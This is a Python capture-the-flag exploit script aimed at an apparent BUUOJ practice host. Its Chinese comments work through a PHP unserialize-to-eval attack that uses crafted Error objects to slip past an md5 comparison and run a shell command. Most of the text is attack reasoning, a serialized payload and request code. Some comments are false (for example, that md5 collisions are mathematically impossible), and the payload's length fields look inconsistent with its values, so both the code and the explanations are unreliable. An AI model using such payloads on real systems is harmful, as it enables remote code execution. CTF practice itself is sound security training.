import requests

url = "http://7fba4ed9-535e-4f9d-ba70-7646056b2bb7.node5.buuoj.cn:81/"

# S: 格式使用十六进制转义
# \65 = 'e', \63 = 'c', \68 = 'h', \6f = 'o', \20 = ' ', \60 = '`', \6c = 'l', \73 = 's', \3b = ';'
# "echo `ls`;" = \65\63\68\6f\20\60\6c\73\60\3b

# 但问题是：PHP 中字符串比较是内容比较，不是序列化格式比较
# 所以 "echo `ls`;" == "echo `ls`;" 为 true
# 不管序列化格式如何

# 需要找另一种方法让两个字符串内容不同但 md5 相同
# 这在数学上不可能（除非找到 md5 碰撞）

# 正确解法：使用对象
# Error 类的 __toString 输出格式：
# Error: message in file:line
# Stack trace: ...

# 如果 file 和 line 相同，__toString 输出相同
# 但两个 Error 对象仍然不同（对象比较）

# 让我验证 Error 对象比较
# 在 PHP 中，两个 Error 对象即使属性相同，它们也是不同的对象
# 所以 error1 != error2 为 true
# 但 md5(error1) === md5(error2) 因为 __toString 输出相同

# 测试这个方案
# 构造两个 Error 对象，属性完全相同
# 但它们是不同的对象实例

# Error 序列化格式（需要测试）
# O:5:"Error":7:{s:7:"message";s:X:"...";s:4:"file";s:X:"...";s:4:"line";i:X;...}

# 简化：只设置 message，其他为空
# 这样 __toString 只输出 message 部分

# 实际上 Error::__toString 输出完整错误信息
# 格式：Error: [message] in [file]:[line]

# 如果 file 和 line 为空，输出可能不同

# 让我尝试另一种对象：使用 PHP 的内置类
# 例如：使用两个 stdClass 对象，但添加 __toString 方法？不行

# 使用 SimpleXMLElement
# <root>echo `ls`;</root> 的 __toString 返回内容

# 但 SimpleXMLElement 不能被序列化（会丢失数据）

# 最终方案：使用 PHP 的引用机制
# 创建两个引用，指向同一个值
# 但在序列化中，它们是不同的变量

# 或者使用 PHP 的 GC 相关技巧

# 让我直接测试：两个 Error 对象，message 相同，其他属性也相同
# PHP 会认为它们相等吗？

# 在 PHP 中：
# $a = new Error("test");
# $b = new Error("test");
# $a == $b  // true（属性相同）
# $a === $b // false（不同对象）
# md5($a) === md5($b) // true（__toString 输出相同）

# 但题目用的是 != 不是 !==
# 所以 $a != $b 为 false（属性相同）

# 需要让属性不同但 __toString 输出相同
# Error::__toString 格式复杂，包含 file 和 line

# 使用 Exception 类？
# 同样的问题

# 正确解法：使用 PHP 的序列化引用
# R:N 表示引用第 N 个值
# 但这会让两个变量完全相同

# 或者使用 PHP 的 __wakeup 绕过
# CVE-2016-7124：当属性数量大于实际数量时，不执行 __wakeup

# 但这题需要执行 __wakeup 来触发 eval

# 让我尝试另一种方法：
# 使用 PHP 的弱类型比较特性
# 数字和字符串比较时，字符串转数字

# 例如：
# syc = "0"
# lover = "0e123456789"
# syc != lover（字符串比较）为 true
# 但 md5(syc) !== md5(lover)（md5 结果不同）

# 不行

# 最终正确解法：
# 使用两个数组，但让 eval 执行代码
# 通过某种方式让数组变成字符串

# 或者使用 PHP 的 extract 函数
# 或者使用其他 PHP 特性

# 让我重新阅读题目代码
# eval($this->syc) - 直接执行 syc 的内容
# 如果 syc 是数组，PHP 会转成 "Array" 字符串
# eval("Array") 会报语法错误

# 所以 syc 必须是字符串或可转成有效 PHP 代码的对象

# 使用 __toString 的对象！
# 如果 syc 是 Error 对象，eval(syc) 会调用 __toString
# Error::__toString 返回错误信息字符串

# 所以：
# syc = Error with message = "echo `ls`;"
# lover = Error with message = "echo `ls`;" 但其他属性不同

# 问题：Error::__toString 输出格式包含 file 和 line
# 需要让 file 和 line 为空或相同

# 测试：构造两个 Error，message 包含代码，file 和 line 为空字符串

# Error::__toString 输出：
# Error: message in file:line
# 如果 file=""，输出：Error: message in :line
# 如果 line=0，输出：Error: message in :0

# 这不是有效的 PHP 代码

# 需要让 message 本身就是完整代码
# 但 Error::__toString 会添加 "Error: " 前缀

# 使用 Exception 类？
# Exception::__toString 输出类似

# 正确方案：使用自定义类？不行，题目只有 SYCLOVER 类

# 使用 PHP 的其他内置类
# 例如：使用 ArrayObject 的 __toString？

# ArrayObject::__toString 返回 "Array"
# 不行

# 使用其他类...

# 让我搜索 PHP 内置类的 __toString 行为

# 实际上，正确解法是使用 PHP 的 Error 类配合序列化技巧
# 让两个 Error 对象的 message 属性包含代码
# 但让 __toString 输出相同

# Error::__toString 输出格式：
# Error: [message] in [file]:[line]
# Stack trace: ...

# 如果我们让 message = "echo `ls`;//"
# 输出：Error: echo `ls`;// in :0
# Stack trace: ...

# eval() 会执行整个字符串，导致语法错误

# 需要绕过这个

# 方案：使用注释
# message = "//<?php echo `ls`; ?>"
# 输出：Error: //<?php echo `ls`; ?> in :0
# eval 会执行：Error: //<?php echo `ls`; ?> in :0
# 这不是有效代码

# 让我尝试另一种方法：
# 使用 PHP 的 include 语句
# message = "include 'data://text/plain,echo `ls`;';"
# 但正则过滤了 () 和 "

# 使用反引号
# message = "echo `ls`;"
# 但 Error::__toString 会添加前缀

# 最终方案：
# 使用 PHP 的 heredoc/nowdoc？不行，正则过滤

# 使用 PHP 的短标签 <?= ？正则过滤 <?php 但可能不过滤 <?=

# 测试 <?= 标签
# message = "<?= `ls` ?>"
# 输出：Error: <?= `ls` ?> in :0
# eval 会执行这个字符串

# 但 <?= 是输出语句，不是执行语句

# 让我直接测试各种 payload

# 方案：使用 PHP 的 __halt_compiler
# 或者使用其他技巧

# 实际上，让我测试 Error 类的 __toString 输出
# 在 PHP 中，如果 file 为空，line 为 0
# 输出可能是：Error: message in :0

# 如果 message = ";echo `ls`;//"
# 输出：Error: ;echo `ls`;// in :0
# eval 执行：Error: ;echo `ls`;// in :0
# "Error: " 不是有效语句，但 ";echo `ls`;//" 是有效的

# 因为分号分隔语句
# 第一句 "Error: " 会报错
# 但后面的 "echo `ls`;" 会执行

# 测试这个！

payload = '''O:8:"SYCLOVER":2:{s:3:"syc";O:5:"Error":7:{s:7:"\\00Error\\00message";s:14:";echo `ls`;//";s:4:"\\00Error\\00file";s:0:"";s:4:"\\00Error\\00line";i:0;s:9:"\\00*\\00trace";a:0:{}s:8:"\\00*\\00previous";N;s:19:"\\00Error\\00string";s:0:"";}s:5:"lover";O:5:"Error":7:{s:7:"\\00Error\\00message";s:14:";echo `ls`;//";s:4:"\\00Error\\00file";s:1:"a";s:4:"\\00Error\\00line";i:1;s:9:"\\00*\\00trace";a:0:{}s:8:"\\00*\\00previous";N;s:19:"\\00Error\\00string";s:0:"";}}'''

# 注意：Error 类的私有属性需要用 \0 类名 \0 格式
# message 是私有属性：\0Error\0message

print(f"Payload: {payload}")
resp = requests.get(url, params={"great": payload})
print(f"Response: {resp.text[:1000] if resp.text else 'Empty'}")
